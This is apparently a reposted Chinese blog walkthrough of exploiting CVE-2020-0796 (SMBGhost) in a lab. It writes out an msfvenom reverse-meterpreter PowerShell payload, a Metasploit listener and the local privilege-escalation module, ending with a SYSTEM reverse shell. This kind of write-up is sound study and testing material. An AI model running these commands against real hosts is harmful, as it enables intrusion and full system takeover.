# CVE-2020-0796的跟踪（二）

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzA3MjM5MDc2Nw==&mid=2650745599&idx=1&sn=6f7909a3de8d9bb1860d4986bba390c8&chksm=87148bffb06302e9d74e74745f706f5291197f169f8b52bf64af1d62f1dd45c060a50f6ffb0e&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzA3MjM5MDc2Nw==&mid=2650745599&idx=1&sn=6f7909a3de8d9bb1860d4986bba390c8&chksm=87148bffb06302e9d74e74745f706f5291197f169f8b52bf64af1d62f1dd45c060a50f6ffb0e&scene=27#wechat_redirect)

一直等CVE-2020-0796的远程利用拿反弹shell的PoC，到本周末也没等到，metasploit只出来个利用既有低权限shell提权到系统权限的PoC，cve\_2020\_0796\_smbghost，鸡肋也是肉，实践一下吧，

首先得拿到一个低权限的shell，一开始我想到的是用nc，shell倒是能拿到，但是弄了半天发现无法转成meterpreter shell，cve\_2020\_0796\_smbghost对普通shell又不work，没办法，只能改用powershell了，

先在metasploit下生成能反弹meterpreter shell的powershell文件，

msfvenom -p windows/x64/meterpreter/reverse\_tcp LHOST=192.168.137.100 LPORT=4444 -f psh-reflection >test.ps1，

把文件弄到靶机里，先别着急运行，因为metasploit这边的监听还没开，

use exploit/multi/handler  
set payload windows/x64/meterpreter/reverse\_tcp  
set LHOST 192.168.137.100  
run  

这就可以去靶机上运行powershel文件了，顺利拿到meterpreter shell，查看用户权限，发现是普通用户，

![](../Images/7260688e5df82b7b5bc5528a8fea627e.png)

下面就可以搞cve\_2020\_0796\_smbghost了，

首先background，让shell session到后台去，然后sessions -l查看shell session的编号，

![](../Images/a4b3511677f04e227d71b65424a82c76.png)

开始搞cve\_2020\_0796\_smbghost，  

use exploit/windows/local/cve\_2020\_0796\_smbghost  
set SESSION 1  
set payload windows/x64/meterpreter/reverse\_tcp  
set LHOST 192.168.137.100  
set LPORT 4445  
run

![](../Images/1feb9a3aba9f7b323a438ade9de0897d.png)

能够拿到一个新的反弹meterpreter shell，再次查看用户权限，发现变成系统用户了，

![](../Images/96815a6c89771073651a6cf63098b715.png)

还是那句话，远程利用拿反弹shell的PoC早晚出来，继续等，祝各位周末愉快。
